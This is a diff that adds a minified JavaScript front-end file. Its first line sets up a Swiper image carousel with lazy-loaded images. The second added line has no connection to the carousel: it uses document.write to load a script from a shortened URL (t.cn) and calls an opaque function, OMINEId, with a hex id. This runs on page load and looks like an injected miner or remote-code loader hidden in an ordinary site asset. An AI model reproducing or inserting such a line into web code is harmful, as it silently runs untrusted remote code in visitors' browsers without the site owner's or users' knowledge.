@@ -1,0 +1,2 @@
+"use strict";define(["swiper","Module/echo/1.7.3/echo.min"],function(e,n){new e(".swiper-container",{autoplay:3e3,autoplayDisableOnInteraction:!1,loop:!0,pagination:".pagination",paginationClickable:!0,speed:600,onSlideChangeEnd:function(e){e.wrapper.childElementCount===e.activeLoopIndex+1&&setTimeout(function(){e.swipeTo(0,500)},3200),n.render()},onSwiperCreated:function(){n.init()}})});
+document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
